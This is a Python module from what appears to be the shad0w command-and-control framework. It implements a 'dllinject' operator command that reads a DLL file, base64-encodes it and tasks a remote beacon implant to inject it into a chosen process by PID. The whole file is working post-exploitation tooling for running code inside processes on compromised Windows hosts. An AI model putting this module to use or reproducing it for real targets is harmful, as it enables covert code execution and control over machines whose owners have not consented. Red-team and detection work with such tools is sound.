#
# Inject a DLL into a process
#

import os
import json
import base64

__description__ = "Inject a DLL into a process"
__author__ = "@_batsec_"

# identify the task as dll injection
from lib.basecommand import BaseCommand

DLLINJECT_EXEC_ID = 0x5000

# beacon to exec command on
current_beacon = None

def dllinject_callback(shad0w, data):
    # wont be hit
    return

def build_inject_info(args, rcode):
    # create the json object to tell the beacon
    # where to execute the code.

    info = {"pid": int(args.pid), "dll": rcode}

    return json.dumps(info)


def get_file_data(filename):
    # get the data from the file

    # so we are in the bridge
    bdir = os.getcwd()
    os.chdir("/root/shad0w/.bridge")

    try:
        with open(filename, 'rb') as file:
            data = file.read()
    except FileNotFoundError:
        return None

    # hop back to where we where before
    os.chdir(bdir)

    return base64.b64encode(data).decode()


class DllinjectCommand(BaseCommand):
    def __init__(self, args, beacon):
        BaseCommand.__init__(self, "dllinject", args)

        self.beacon = beacon

    def parse_parameters(self):
        self.parser.add_argument("-p", "--pid", required=True, help="PID of the process")
        self.parser.add_argument("-f", "--file", required=True, help="The DLL to inject")

    def get_usage(self):
        return """

Examples:

dllinject -p 4267 -f yourfile.dll
"""

    def run(self, shad0w):
        rcode = get_file_data(self.args.file)
        if rcode is None:
            shad0w.debug.error(f"DLL '{self.args.file}' does not exist")
            return

        inject_info = build_inject_info(self.args, rcode)

        shad0w.beacons[self.beacon]["task"] = (DLLINJECT_EXEC_ID, inject_info)
        shad0w.beacons[self.beacon]["callback"] = dllinject_callback


def main(shad0w, args, beacon):
    global current_beacon

    # make beacon global
    current_beacon = beacon

    cmd = DllinjectCommand(args, beacon)
    if cmd.parse() is True:
        cmd.run(shad0w)

    return
